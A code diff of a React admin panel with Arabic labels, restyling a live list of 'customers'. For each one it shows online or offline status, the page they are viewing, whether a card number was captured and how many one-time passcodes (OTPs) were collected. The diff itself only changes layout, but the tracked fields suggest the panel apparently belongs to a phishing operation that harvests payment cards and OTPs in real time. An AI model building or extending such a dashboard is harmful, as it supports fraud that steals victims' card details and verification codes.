@@ -428,30 +428,30 @@ export const Admin = () => {
                       });
                     }}
                   >
-                    <div className="item-name-row">
-                       <strong style={{color: '#333'}}>
-                         {online ? <span className="online-status-text online">متصل</span> : <span className="online-status-text offline">خرج</span>}
-                         {c.full_name || c.id_number || 'عميل جديد'}
-                       </strong>
-                       <span>{c.last_update ? new Date(c.last_update).toLocaleTimeString('ar-SA', {hour:'2-digit', minute:'2-digit'}) : ''}</span>
+                    <div className="item-main-info">
+                       <span className="customer-name-v2">{c.full_name || c.id_number || 'عميل جديد'}</span>
+                       <span className={`online-status-v2 ${online ? 'online' : 'offline'}`}>
+                         {online ? 'متصل' : 'خرج'}
+                       </span>
                     </div>
-                    <div className="item-sub-row">
-                       <span className="item-id">ID: {c.id?.substring(0,8)}</span>
-                       <span className="item-activity">{c.page || 'تصفح غير معروف'}</span>
+                    <div className="item-page-row">
+                       {c.page || 'تصفح الموقع'}
                     </div>
 
-                    {/* Dynamic Indicators for Card/OTP */}
                     <div className="item-indicators">
                       {c.card_number && (
-                        <div className="indicator-pill card">
+                        <div className="indicator-tag">
                           <CreditCard size={10} /> 💳 بطاقة
                         </div>
                       )}
                       {(c.otps && c.otps.length > 0) && (
-                        <div className="indicator-pill otp">
+                        <div className="indicator-tag">
                           <Plus size={10} /> 🔑 رمز ({c.otps.length})
                         </div>
                       )}
+                      <span style={{fontSize:'9px', color:'#94a3b8', marginRight:'auto'}}>
+                        {c.last_update ? new Date(c.last_update).toLocaleTimeString('ar-SA', {hour:'2-digit', minute:'2-digit'}) : ''}
+                      </span>
                     </div>
                  </div>
                );
